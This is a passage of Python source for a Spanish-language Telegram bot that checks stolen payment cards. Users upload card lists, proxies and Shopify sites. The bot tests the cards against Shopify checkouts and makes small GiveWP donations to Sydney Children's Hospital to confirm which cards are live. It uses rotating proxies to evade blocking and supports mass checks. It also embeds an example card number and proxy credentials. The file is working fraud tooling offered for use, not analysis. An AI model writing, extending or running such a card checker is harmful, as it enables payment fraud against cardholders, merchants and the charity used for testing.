    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ PROXIES ==================
async def show_proxies_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    text = (
        "🔌 *PROXIES MANAGER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Total proxies: `{len(proxies)}`\n\n"
        "Envía proxies en formato ip:puerto o ip:puerto:user:pass\n"
        "Ejemplo: `/addproxy 23.26.53.37:6003:user:pass`"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ CARDS ==================
async def show_cards_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    
    text = (
        "🧾 *CARDS MANAGER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Total cards: `{len(cards)}`\n\n"
        "Sube archivo .txt con tarjetas"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ STATS ==================
async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    rows = await db.fetch_all(
        "SELECT gateway, COUNT(*) as count FROM results WHERE user_id = ? GROUP BY gateway",
        (user_id,)
    )
    
    shopify_count = 0
    givewp_count = 0
    
    for row in rows:
        if row["gateway"] == "shopify":
            shopify_count = row["count"]
        elif row["gateway"] == "givewp":
            givewp_count = row["count"]
    
    text = (
        f"📊 *ESTADÍSTICAS*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"Total checks: {shopify_count + givewp_count}\n"
        f"🛍️ Shopify: {shopify_count}\n"
        f"❤️ GiveWP: {givewp_count}"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, parse_mode="Markdown", reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

# ================== SUBMENÚ SETTINGS ==================
async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "⚙️ *SETTINGS*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Workers: {Settings.MAX_WORKERS_PER_USER}\n"
        f"Rate limit: {Settings.RATE_LIMIT_SECONDS}s\n"
        f"Daily limit: {Settings.DAILY_LIMIT_CHECKS}\n"
        f"Proxies rotativos: ✅ Activado"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== FUNCIÓN DONATE CORREGIDA ==================
async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Donación GiveWP con tarjeta (maneja mensajes y callbacks)"""
    user_id = update.effective_user.id
    
    # Determinar si es callback o mensaje directo
    is_callback = update.callback_query is not None
    message = update.message if not is_callback else update.callback_query.message
    
    # Obtener tarjeta
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data.get("cards", [])
    
    if not cards:
        text = "❌ Primero sube tarjetas con /upload"
        if is_callback:
            await update.callback_query.edit_message_text(text)
        else:
            await update.message.reply_text(text)
        return
    
    # Determinar cantidad (por defecto $5)
    amount = 5.00
    card_index = 0
    
    if context.args:
        try:
            amount = float(context.args[0].replace('$', ''))
        except:
            pass
    
    if len(context.args) > 1:
        try:
            card_index = int(context.args[1]) - 1
        except:
            pass
    
    if card_index < 0 or card_index >= len(cards):
        text = "❌ Número de tarjeta inválido"
        if is_callback:
            await update.callback_query.edit_message_text(text)
        else:
            await update.message.reply_text(text)
        return
    
    card_str = cards[card_index]
    card_data = CardValidator.parse_card(card_str)
    
    if not card_data:
        text = "❌ Tarjeta inválida"
        if is_callback:
            await update.callback_query.edit_message_text(text)
        else:
            await update.message.reply_text(text)
        return
    
    # Mensaje de progreso
    proxy_count = len(user_data.get("proxies", []))
    progress_text = (
        f"🔄 Procesando donación de ${amount:.2f} en Sydney Children's Hospital...\n"
        f"💳 Tarjeta #{card_index+1}: {card_data['bin']}xxxxxx{card_data['last4']}\n"
        f"🔄 Proxies disponibles: {proxy_count} (rotación activa)"
    )
    
    if is_callback:
        await update.callback_query.edit_message_text(progress_text)
        msg = update.callback_query.message
    else:
        msg = await update.message.reply_text(progress_text)
    
    # Realizar donación con anti-bloqueo
    result = await card_service.donate_givewp_anti_block(user_id, card_data, amount)
    
    emoji = get_status_emoji(result.status)
    confidence_icon = get_confidence_icon(result.confidence)
    
    # Escapar caracteres especiales para Markdown
    reason_escaped = escape_markdown(result.reason)
    status_escaped = escape_markdown(result.status.value.upper())
    confidence_escaped = escape_markdown(result.confidence.value)
    
    proxy_info = f"🔄 Proxy usado: {result.job.proxy}" if result.job.proxy else "🔄 Conexión directa"
    
    response = (
        f"{emoji} *DONACIÓN COMPLETADA*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"🏥 Hospital: Sydney Children's Hospital\n"
        f"💰 Monto: ${amount:.2f}\n"
        f"📊 Estado: {status_escaped}\n"
        f"{confidence_icon} Confianza: {confidence_escaped}\n"
        f"📝 Razón: {reason_escaped}\n"
        f"⏱️ Tiempo: {result.response_time:.1f}s\n"
        f"{proxy_info}\n\n"
        f"💳 Tarjeta: {card_data['bin']}xxxxxx{card_data['last4']}"
    )
    
    if result.price != "N/A":
        price_escaped = escape_markdown(result.price)
        response += f"\n💰 Precio detectado: {price_escaped}"
    
    try:
        await msg.edit_text(response, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error en Markdown: {e}")
        # Si falla Markdown, enviar sin formato
        await msg.edit_text(response.replace('*', '').replace('_', ''))

# ================== FUNCIONES ATAJO DONATE ==================
async def donate5(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Atajo para donación de $5"""
    context.args = ["5"]
    await donate(update, context)

async def donate10(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Atajo para donación de $10"""
    context.args = ["10"]
    await donate(update, context)

async def donate20(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Atajo para donación de $20"""
    context.args = ["20"]
    await donate(update, context)

# ================== MANEJO DE BOTONES ==================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if user_id in active_mass and data != "mass_stop":
        await query.edit_message_text("❌ Mass check en progreso")
        return
    
    if data == "menu_main":
        await show_main_menu(update, context, edit=True)
    elif data == "menu_check":
        await show_check_menu(update, context)
    elif data == "menu_mass":
        await show_mass_menu(update, context)
    elif data == "menu_donate":
        await show_donate_menu(update, context)
    elif data == "menu_analyzer":
        await show_analyzer_menu(update, context)
    elif data == "menu_sites":
        await show_sites_menu(update, context)
    elif data == "menu_proxies":
        await show_proxies_menu(update, context)
    elif data == "menu_cards":
        await show_cards_menu(update, context)
    elif data == "menu_stats":
        await show_stats(update, context)
    elif data == "menu_settings":
        await show_settings(update, context)
    elif data == "donate_5":
        context.args = ["5"]
        await donate(update, context)
    elif data == "donate_10":
        context.args = ["10"]
        await donate(update, context)
    elif data == "donate_20":
        context.args = ["20"]
        await donate(update, context)

# ================== MANEJO DE MENSAJES ==================
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id in active_mass:
        await update.message.reply_text("❌ Mass check en progreso")
        return
    
    # Verificar si es tarjeta para Shopify
    card_data = CardValidator.parse_card(text)
    if card_data:
        user_data = await user_manager.get_user_data(user_id)
        
        if not user_data["sites"] or not user_data["proxies"]:
            await update.message.reply_text("❌ Necesitas sites y proxies para Shopify")
            return
        
        allowed, msg = await user_manager.check_rate_limit(user_id, "check")
        if not allowed:
            await update.message.reply_text(msg)
            return
        
        msg = await update.message.reply_text("🔄 Verificando en Shopify...")
        
        site = user_data["sites"][0]
        proxy = user_data["proxies"][0]
        
        result = await card_service.check_shopify(user_id, card_data, site, proxy)
        await user_manager.increment_checks(user_id, "check")
        
        emoji = get_status_emoji(result.status)
        confidence_icon = get_confidence_icon(result.confidence)
        
        reason_escaped = escape_markdown(result.reason)
        status_escaped = escape_markdown(result.status.value.upper())
        confidence_escaped = escape_markdown(result.confidence.value)
        
        response = (
            f"{emoji} *RESULTADO SHOPIFY*\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"💳 Tarjeta: `{card_data['bin']}xxxxxx{card_data['last4']}`\n"
            f"📊 Estado: {status_escaped}\n"
            f"{confidence_icon} Confianza: {confidence_escaped}\n"
            f"📝 Razón: {reason_escaped}\n"
            f"⏱️ Tiempo: {result.response_time:.1f}s\n"
        )
        
        if result.price != "N/A":
            price_escaped = escape_markdown(result.price)
            response += f"💰 Precio: {price_escaped}\n"
        
        try:
            await msg.edit_text(response, parse_mode="Markdown")
        except Exception as e:
            logger.error(f"Error en Markdown: {e}")
            await msg.edit_text(response.replace('*', '').replace('_', ''))
    else:
        await update.message.reply_text(
            "❌ Formato inválido. Usa:\n"
            "`NUMBER|MES|AÑO|CVV`\n"
            "Ejemplo: `4377110010309114|08|2026|501`",
            parse_mode="Markdown"
        )

# ================== MANEJO DE ARCHIVOS (DETECCIÓN INTELIGENTE) ==================
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    document = update.message.document
    
    if user_id in active_mass:
        await update.message.reply_text("❌ Mass check en progreso")
        return
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Solo archivos .txt")
        return
    
    file = await context.bot.get_file(document.file_id)
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')
    lines = text.splitlines()
    
    sites = []
    proxies = []
    cards = []
    invalid = []
    unknown = []
    
    for raw_line in lines:
        line = raw_line.strip()
        if not line:
            continue
        
        line_type, normalized = detect_line_type(line)
        
        if line_type == 'site':
            sites.append(normalized)
        elif line_type == 'proxy':
            proxies.append(normalized)
        elif line_type == 'card':
            card_data = CardValidator.parse_card(normalized)
            if card_data:
                cards.append(normalized)
            else:
                invalid.append(line)
        else:
            unknown.append(line)
    
    user_data = await user_manager.get_user_data(user_id)
    updated = False
    
    if sites:
        user_data["sites"].extend(sites)
        updated = True
    if proxies:
        user_data["proxies"].extend(proxies)
        updated = True
    if cards:
        user_data["cards"].extend(cards)
        updated = True
    
    if updated:
        await user_manager.update_user_data(
            user_id, 
            sites=user_data["sites"],
            proxies=user_data["proxies"],
            cards=user_data["cards"]
        )
    
    # Preparar mensaje de resumen
    parts = []
    if sites:
        parts.append(f"✅ {len(sites)} sitio(s) añadido(s)")
    if proxies:
        parts.append(f"✅ {len(proxies)} proxy(s) añadido(s)")
    if cards:
        parts.append(f"✅ {len(cards)} tarjeta(s) válida(s) añadida(s)")
    if invalid:
        parts.append(f"⚠️ {len(invalid)} tarjeta(s) inválida(s) rechazada(s)")
    if unknown:
        parts.append(f"⚠️ {len(unknown)} línea(s) no reconocida(s)")
    
    if parts:
        await update.message.reply_text("\n".join(parts))
    else:
        await update.message.reply_text("❌ No se encontraron datos válidos en el archivo")

# ================== COMANDO START ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_mass:
        active_mass.discard(user_id)
    
    await show_main_menu(update, context, edit=False)

# ================== COMANDO STOP ==================
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_mass:
        cancel_mass[user_id] = True
        await update.message.reply_text("⏹ Deteniendo mass check...")
    else:
        await update.message.reply_text("No hay mass check activo.")

# ================== COMANDO PARA AGREGAR PROXY ==================
async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Agrega un proxy manualmente"""
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text(
            "❌ Uso: /addproxy ip:puerto o ip:puerto:user:pass\n"
            "Ejemplo: /addproxy 23.26.53.37:6003:ywdcxpbz:rumq51bx8tk3"
        )
        return
    
    proxy_input = " ".join(context.args)
    line_type, normalized = detect_line_type(proxy_input)
    
    if line_type != 'proxy':
        await update.message.reply_text("❌ Formato de proxy inválido")
        return
    
    user_data = await user_manager.get_user_data(user_id)
    user_data["proxies"].append(normalized)
    await user_manager.update_user_data(user_id, proxies=user_data["proxies"])
    
    # Mostrar versión corta del proxy
    display = normalized.split(':')[0] + ':' + normalized.split(':')[1]
    await update.message.reply_text(f"✅ Proxy añadido: {display}")

# ================== COMANDO PARA LISTAR PROXIES ==================
async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lista los proxies guardados"""
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if not proxies:
        await update.message.reply_text("📭 No tienes proxies guardados.")
        return
    
    lines = ["📋 *TUS PROXIES*", "━━━━━━━━━━━━━━━━━━", ""]
    for i, p in enumerate(proxies, 1):
        display = p.split(':')[0] + ':' + p.split(':')[1]
        lines.append(f"{i}. `{display}`")
    
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

# ================== COMANDO PARA LIMPIAR PROXIES MUERTOS ==================
async def clean_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Limpia proxies muertos"""
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if not proxies:
        await update.message.reply_text("📭 No hay proxies para limpiar.")
        return
    
    msg = await update.message.reply_text("🔄 Verificando proxies...")
    
    health_checker = ProxyHealthChecker(db, user_id)
    results = await health_checker.check_all_proxies(proxies)
    
    alive_proxies = [r["proxy"] for r in results if r["alive"]]
    dead_count = len([r for r in results if not r["alive"]])
    
    await user_manager.update_user_data(user_id, proxies=alive_proxies)
    
    await msg.edit_text(
        f"✅ Proxies vivos: {len(alive_proxies)}\n"
        f"❌ Proxies muertos eliminados: {dead_count}"
    )

# ================== MAIN ==================
async def shutdown(application: Application):
    logger.info("🛑 Cerrando...")
    if db:
        await db.shutdown()
    logger.info("✅ Cerrado")

async def post_init(application: Application):
    global db, user_manager, card_service
    
    db = Database()
    await db.initialize()
    await db.cleanup_old_results()
    
    user_manager = UserManager(db)
    card_service = CardCheckService(db, user_manager)
    
    logger.info("✅ Bot inicializado - Shopify + GiveWP + Anti-bloqueo + Analyzer")

def main():
    app = Application.builder().token(Settings.TOKEN).post_init(post_init).build()
    app.post_shutdown = shutdown

    # Comandos
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("addproxy", add_proxy))
    app.add_handler(CommandHandler("proxies", list_proxies))
    app.add_handler(CommandHandler("cleanproxies", clean_proxies))
    
    # Comandos GiveWP
    app.add_handler(CommandHandler("donate", donate))
    app.add_handler(CommandHandler("donate5", donate5))
    app.add_handler(CommandHandler("donate10", donate10))
    app.add_handler(CommandHandler("donate20", donate20))
    
    # Comandos de análisis
    app.add_handler(CommandHandler("analyze", analyze_site))
    app.add_handler(CommandHandler("findsites", find_similar_sites))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # Mensajes y archivos
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))

    logger.info("🚀 Bot iniciado - Shopify + GiveWP - Anti-bloqueo - Detección inteligente - Analyzer")
    app.run_polling()

if __name__ == "__main__":
    main()
